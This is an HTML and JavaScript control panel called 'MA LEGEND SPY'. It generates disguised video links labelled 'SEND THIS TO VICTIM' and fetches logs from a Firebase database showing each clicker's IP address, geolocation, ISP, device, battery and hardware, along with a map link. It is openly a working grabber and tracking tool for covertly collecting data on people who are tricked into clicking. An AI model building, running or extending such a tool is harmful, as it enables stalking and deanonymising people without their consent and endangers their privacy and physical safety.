<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MA LEGEND | SUPREME CONTROL</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Poppins:wght@400;600&display=swap');
        body { background: #e0e5ec; font-family: 'Poppins', sans-serif; color: #44476a; display: flex; justify-content: center; padding: 20px; }
        .container { width: 100%; max-width: 500px; }
        .neu-card { background: #e0e5ec; padding: 25px; border-radius: 30px; box-shadow: 9px 9px 16px #bcbfc5, -9px -9px 16px #ffffff; margin-bottom: 25px; }
        h2 { font-family: 'Orbitron'; color: #00a884; text-align: center; letter-spacing: 2px; font-size: 1.2rem; }
        label { font-size: 0.7rem; font-weight: bold; margin-left: 10px; }
        input { width: 100%; padding: 15px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: inset 6px 6px 12px #cbcbe1, inset -6px -6px 12px #ffffff; outline: none; margin: 10px 0; box-sizing: border-box; font-family: 'Poppins'; }
        .btn { width: 100%; padding: 15px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; color: #00a884; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; margin-top: 10px; transition: 0.3s; }
        .btn:active { box-shadow: inset 4px 4px 8px #bcbfc5, inset -4px -4px 8px #ffffff; }
        .log-card { background: #e0e5ec; padding: 20px; border-radius: 20px; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; margin-top: 20px; font-size: 0.75rem; border-left: 6px solid #00a884; animation: fadeIn 0.5s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .row { display: flex; justify-content: space-between; border-bottom: 1px solid rgba(0,0,0,0.05); padding: 5px 0; }
        .row b { color: #00a884; }
    </style>
</head>
<body>
    <div class="container">
        <div class="neu-card">
            <h2>MA LEGEND SPY</h2>
            <p style="text-align:center; font-size:10px; opacity:0.6;">MULTI-USER PRIVACY ENABLED</p>
            
            <label>YOUR SECRET KEY:</label>
            <input type="text" id="user-key" placeholder="Enter any name/key...">
            
            <label>TARGET VIDEO LINK:</label>
            <input type="text" id="vid-url" placeholder="YouTube, FB, or any video link...">
            
            <button class="btn" onclick="generateLink()">GENERATE LINK</button>
            
            <div id="result-box" style="display:none; margin-top:20px;">
                <label>SEND THIS TO VICTIM:</label>
                <input type="text" id="final-link" readonly onclick="this.select()">
            </div>
        </div>

        <div class="neu-card">
            <button class="btn" onclick="fetchLogs()" style="color: #44476a;">REFRESH MY LOGS</button>
            <div id="logs-container"></div>
        </div>
    </div>

    <audio id="ping" src="https://www.myinstants.com/media/sounds/notification.mp3"></audio>

    <script>
        const FB_URL = "https://legend-tricker-default-rtdb.asia-southeast1.firebasedatabase.app/users/";
        let lastCount = 0;

        function generateLink() {
            const key = document.getElementById('user-key').value.trim();
            const vid = document.getElementById('vid-url').value.trim();
            if(!key || !vid) return alert("Please fill both fields!");

            const baseUrl = window.location.href.replace('admin.html', 'index.html');
            const encoded = btoa(key + "|" + vid);
            document.getElementById('final-link').value = baseUrl + "?id=" + encoded;
            document.getElementById('result-box').style.display = 'block';
        }

        async function fetchLogs() {
            const key = document.getElementById('user-key').value.trim();
            if(!key) return alert("Enter your Key first!");

            try {
                const res = await fetch(`${FB_URL}${key}.json`);
                const data = await res.json();
                const container = document.getElementById('logs-container');
                container.innerHTML = "";

                if(!data) { container.innerHTML = "<p style='text-align:center; margin-top:10px;'>No logs yet.</p>"; return; }

                if(Object.keys(data).length > lastCount && lastCount !== 0) document.getElementById('ping').play();
                lastCount = Object.keys(data).length;

                Object.keys(data).reverse().forEach(id => {
                    const l = data[id];
                    container.innerHTML += `
                        <div class="log-card">
                            <div class="row"><b>üïí Time:</b> <span>${l.time}</span></div>
                            <div class="row"><b>üì± Device:</b> <span>${l.dev}</span></div>
                            <div class="row"><b>üåê IP:</b> <span>${l.ip}</span></div>
                            <div class="row"><b>üìç Location:</b> <span>${l.loc}</span></div>
                            <div class="row"><b>üì° ISP:</b> <span>${l.isp}</span></div>
                            <div class="row"><b>üîã Battery:</b> <span>${l.batt}</span></div>
                            <div class="row"><b>üß† Hardware:</b> <span>${l.cpu} Core | ${l.ram}GB RAM</span></div>
                            <div class="row"><b>üñ•Ô∏è GPU:</b> <span>${l.gpu}</span></div>
                            <a href="${l.map}" target="_blank" style="display:block; text-align:center; background:#00a884; color:#fff; padding:10px; border-radius:10px; text-decoration:none; margin-top:10px; font-weight:bold;">VIEW ON MAP</a>
                        </div>`;
                });
            } catch(e) { alert("Error fetching data!"); }
        }
    </script>
</body>
</html>
